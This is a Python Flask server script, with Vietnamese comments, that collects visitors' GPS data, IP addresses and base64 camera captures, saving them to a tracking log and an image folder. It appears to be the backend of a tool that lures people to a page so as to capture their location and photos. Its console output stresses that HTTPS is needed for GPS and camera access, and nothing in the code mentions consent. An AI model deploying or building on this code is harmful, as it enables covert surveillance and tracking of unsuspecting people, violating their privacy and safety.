import os
import base64
import json
from datetime import datetime
from flask import Flask, render_template, request, jsonify

app = Flask(__name__)

# Đảm bảo thư mục lưu log tồn tại
LOG_DIR = 'logs'
IMAGE_DIR = os.path.join(LOG_DIR, 'images')
os.makedirs(IMAGE_DIR, exist_ok=True)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/log', methods=['POST'])
def log_data():
    data = request.get_json()
    data['ip'] = request.remote_addr
    data['server_time'] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    log_file = os.path.join(LOG_DIR, 'tracking_log.jsonl')
    with open(log_file, 'a', encoding='utf-8') as f:
        f.write(json.dumps(data) + '\n')
    
    print(f"[+] Dữ liệu GPS nhận được từ {data['ip']}")
    return jsonify({"status": "ok"})

@app.route('/upload_image', methods=['POST'])
def upload_image():
    data = request.get_json()
    image_data = data.get('image')
    
    if image_data and ',' in image_data:
        header, encoded = image_data.split(',', 1)
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"capture_{timestamp}.jpg"
        filepath = os.path.join(IMAGE_DIR, filename)
        
        with open(filepath, "wb") as f:
            f.write(base64.b64decode(encoded))
        
        print(f"[+] Ảnh đã được lưu: {filepath}")
    
    return jsonify({"status": "ok"})

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    print("="*50)
    print("SERVER THỬ NGHIỆM ĐANG CHẠY")
    print(f"Địa chỉ: http://0.0.0.0:{port}")
    print("LƯU Ý: Để lấy được GPS/Camera, bạn phải truy cập qua HTTPS")
    print("="*50)
    app.run(host='0.0.0.0', port=port)
